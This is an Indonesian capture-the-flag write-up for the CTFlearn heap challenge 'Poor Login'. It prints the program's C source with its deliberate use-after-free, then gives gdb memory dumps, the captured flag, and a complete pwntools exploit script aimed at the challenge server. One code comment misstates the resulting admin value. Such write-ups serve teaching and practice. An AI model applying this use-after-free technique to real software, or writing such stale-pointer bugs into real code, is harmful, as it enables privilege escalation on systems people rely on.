# Poor Login (60 Points)
Heap pwning can be easy right? Here's something to look at.
<br>
<code>nc thekidofarcrania.com 13226</code>
# Solved
Cek source tersebut
```cpp
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int menu() {
  printf("*** WINBLOWS LOGIN *********\n"
      "1. Login into user.\n"
      "2. Sign out.\n"
      "3. Print flag.\n"
      "4. Lock user.\n"
      "5. Restore user.\n"
      "> ");

  int resp = 0;
  scanf("%d", &resp);
  while (getchar() != '\n');
  return resp;
}

struct creds {
  void *padding;
  char name[32];
  int admin;
};


struct creds *curr;
struct creds *save;

char *fake_flag;

int main() {
  char buff[64];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);

  while (1) {
    switch (menu()) {
      case 1:  // Login
        curr = malloc(sizeof(*curr));

        printf("Username: ");
        fgets(curr->name, sizeof(curr->name), stdin);
        strtok(curr->name, "\n");

        curr->admin = 0;
        break;
      case 2: // Sign out
        if (!curr) {
          puts("You are not logged in!");
          break;
        }
        free(curr);
        curr = NULL;
        puts("You have been successfully logged out.");
        break;
      case 3: // Print flag
        if (curr && curr->admin) {
          puts("Here's your flag:");
          system("/bin/cat /flag.txt");
        } else {
          if (!fake_flag) {
            puts("You are not admin. Would you like to create a new flag instead?");
            fgets(buff, sizeof(buff), stdin);
            fake_flag = strdup(buff);
          }
          printf("Here's your flag: %s", fake_flag);
        }
        break;
      case 4: // Lock user
        if (curr == NULL) {
          puts("You are not logged in!");
          break;
        }

        puts("User has been locked now.");
        save = curr;
        break;
      case 5: // Restore user
        if (curr != NULL) {
          puts("You are already logged. Sign out first!");
        } else if (save == NULL) {
          puts("No user is currently locked!");
        } else {
          printf("Welcome back, %s!\n", save->name);
          curr = save;
          save = NULL;
        }
        break;
      default:
        puts("Invalid choice");
    }
  }
}
```
<i>Jika sebelumnya kalian tidak tau maksud dari <b>Heap Exploit</b>, silahkan cek di youtubenya <b>Liveoverflow</b></i>. Disini jika saya eksekusi file tersebut
```console
$ ./login
*** WINBLOWS LOGIN *********
1. Login into user.
2. Sign out.
3. Print flag.
4. Lock user.
5. Restore user.
>
```
Kita disuruh pilih dari 5 pilihan tersebut. Disini sudah saya analisa bahwa <b>Heap Exploit</b> nya berada pada
```cpp
if (!fake_flag) {
    puts("You are not admin. Would you like to create a new flag instead?");
    fgets(buff, sizeof(buff), stdin);
    fake_flag = strdup(buff);
}
```
Dari sini bisa kita lihat bahwa fungsi tersebut memanggil <b>strdup</b> atau (String Duplicate) yang diberi Buffer sebanyak <b>64 Byte</b>. sedangkan struktur dari kredentikal tersebut memiliki besar sekitar <b>36 byte</b>. Kemudian pada nomor <b>4</b> dan <b>5</b>
```cpp
case 4: // Lock user
    if (curr == NULL) {
        puts("You are not logged in!");
        break;
    }

    puts("User has been locked now.");
    save = curr;
    break;
case 5: // Restore user
    if (curr != NULL) {
        puts("You are already logged. Sign out first!");
    } else if (save == NULL) {
        puts("No user is currently locked!");
    } else {
        printf("Welcome back, %s!\n", save->name);
        curr = save;
        save = NULL;
    }
    break;
```
Pada case 4, menyimpan <b>memory</b> dari struktur curr untuk pointer save. Sedangkan case 5 melakukan sebaliknya. Jadi instruksi yang kita harus lakukan adalah <b>Login</b> kemudian dump address curr. <b>Masukan 31 Huruf untuk login</b>
```console
$ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
gdb-peda$ x/40wx (void*)curr
0x84032a0:      0x00000000      0x00000000      0x41414141      0x41414141
0x84032b0:      0x41414141      0x41414141      0x41414141      0x41414141
0x84032c0:      0x41414141      0x00414141      0x00000000      0x00000000
0x84032d0:      0x00000000      0x00000000      0x00020d31      0x00000000
```
Target kita adalah mengisi address diatas <b>0x00020d31</b>, Kemudian saya <b>Lock</b> akun tersebut
```
*** WINBLOWS LOGIN *********
1. Login into user.
2. Sign out.
3. Print flag.
4. Lock user.
5. Restore user.
> 4
User has been locked now.
```
```console
gdb-peda$ x/40wx (void*)curr
0x84032a0:      0x00000000      0x00000000      0x41414141      0x41414141
0x84032b0:      0x41414141      0x41414141      0x41414141      0x41414141
0x84032c0:      0x41414141      0x00414141      0x00000000      0x00000000
0x84032d0:      0x00000000      0x00000000      0x00020d31      0x00000000
0x84032e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x84032f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403300:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403310:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403320:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403330:      0x00000000      0x00000000      0x00000000      0x00000000
gdb-peda$ x/40wx (void*)save
0x84032a0:      0x00000000      0x00000000      0x41414141      0x41414141
0x84032b0:      0x41414141      0x41414141      0x41414141      0x41414141
0x84032c0:      0x41414141      0x00414141      0x00000000      0x00000000
0x84032d0:      0x00000000      0x00000000      0x00020d31      0x00000000
0x84032e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x84032f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403300:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403310:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403320:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403330:      0x00000000      0x00000000      0x00000000      0x00000000
```
Disini bisa kita lihat, curr dan save memiliki value yang sama. Kemudian saya <b>Logout</b> kan
```console
gdb-peda$ x/40wx (void*)save
0x84032a0:      0x00000000      0x00000000      0x08403010      0x00000000
0x84032b0:      0x41414141      0x41414141      0x41414141      0x41414141
0x84032c0:      0x41414141      0x00414141      0x00000000      0x00000000
0x84032d0:      0x00000000      0x00000000      0x00020d31      0x00000000
0x84032e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x84032f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403300:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403310:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403320:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403330:      0x00000000      0x00000000      0x00000000      0x00000000
gdb-peda$ x/40wx (void*)curr
0x0:    Cannot access memory at address 0x0
```
Jika kita perhatikan pada case 2, instruksi kode tersebut melakukan <b>free</b> pada pointer curr
```cpp
case 2: // Sign out
    if (!curr) {
        puts("You are not logged in!");
        break;
    }
    free(curr);
    curr = NULL;
    puts("You have been successfully logged out.");
    break;
```
Kemudian saya melakukan <b>Restore user</b>
```console
*** WINBLOWS LOGIN *********
1. Login into user.
2. Sign out.
3. Print flag.
4. Lock user.
5. Restore user.
> 5
Welcome back, 0!
```
```console
gdb-peda$ x/40wx (void*)save
0x0:    Cannot access memory at address 0x0
gdb-peda$ x/40wx (void*)curr
0x84032a0:      0x00000000      0x00000000      0x08403010      0x00000000
0x84032b0:      0x41414141      0x41414141      0x41414141      0x41414141
0x84032c0:      0x41414141      0x00414141      0x00000000      0x00000000
0x84032d0:      0x00000000      0x00000000      0x00020d31      0x00000000
0x84032e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x84032f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403300:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403310:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403320:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403330:      0x00000000      0x00000000      0x00000000      0x00000000
```
Jika kita lihat perbandingan address sebelumnya yang berbeda adalah <b>0x08403010</b>, dari sini saya melihat bahwa address dari curr tidak berubah, Nah sekarang kita harus memanggil fungsi <b>strdup</b> pada case 3 dan mencapai address <b>admin</b>.
```console
$ r "print 'A' * 42"
gdb-peda$ x/40wx (void*)curr
0x84032a0:      0x41414141      0x41414141      0x41414141      0x41414141
0x84032b0:      0x41414141      0x41414141      0x41414141      0x41414141
0x84032c0:      0x41414141      0x41414141      0x000a4141      0x00000000
0x84032d0:      0x00000000      0x00000000      0x00020d31      0x00000000
0x84032e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x84032f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403300:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403310:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403320:      0x00000000      0x00000000      0x00000000      0x00000000
0x8403330:      0x00000000      0x00000000      0x00000000      0x00000000
gdb-peda$ x/40wx (void*)save
0x0:    Cannot access memory at address 0x0
gdb-peda$
```
Value / Jumlah dari struktur curr pada admin : <b>0x000a4141</b> / <b>672065</b>. Disini sudah bisa dilihat bahwa saya sudah melakukan Overwrite pada struktur creds tersebut dan mengubah value dari admin yang awalnya adalah <b>0x00</b>. Dikarenakan sudah melebihi 1 / != 0, saya melakukan print flag lagi.
```console
Here's your flag:
CTFlearn{I_sh0uldve_done_a_ref_counter!!_:PPPPP}
```
Solving dalam 30 menit ;D. Jika kalian ingin melakukannya dengan cepat, saya sudah membuat kode python untuk mendapatkan flagnya secara cepat
```python
from pwn import *

p = remote("thekidofarcrania.com", 13226)

# Set dulu username
log.info("Setting Username...")
p.recvuntil("WINBLOWS LOGIN")
p.sendline("1")
p.recvuntil("Username:")
p.sendline("A" * 31)

# Kemudian Lock User agar tersimpan pada pointer save (void*)save
log.info("Lock User to pointer save")
p.recvuntil("WINBLOWS LOGIN")
p.sendline("4")

# Kemudian Logout agar mengclean address dari (void*)curr
log.info("Cleaning pointer curr (free)")
p.recvuntil("WINBLOWS LOGIN")
p.sendline("2")

# Kemudian ambil kembali pointer dari (void*)save untuk (void*)curr
# Disini lah letak celahnya, pointer save tidak melakukan memcpy alias hanya melakukan operator =
log.info("Retrieve pointer save to curr (without memcpy)")
p.recvuntil("WINBLOWS LOGIN")
p.sendline("5")

# Heap pada struktur creds
log.info("Heap memory with 42 byte (Name = 32 Byte)")
p.recvuntil("WINBLOWS LOGIN")
p.sendline("3")
p.recvuntil("flag instead?")
p.sendline("A" * 42) # Membuat admin menjadi 0x42424242

# Mengprint-flag aslinya
log.info("Printing flag")
p.recvuntil("WINBLOWS LOGIN")
p.sendline("3")
res = p.recvuntil("Here's your flag:\n")
res = p.recvline()

log.success("Flag : " + res)
p.close()
```
Flag : <b>CTFlearn{I_sh0uldve_done_a_ref_counter!!_:PPPPP}</b>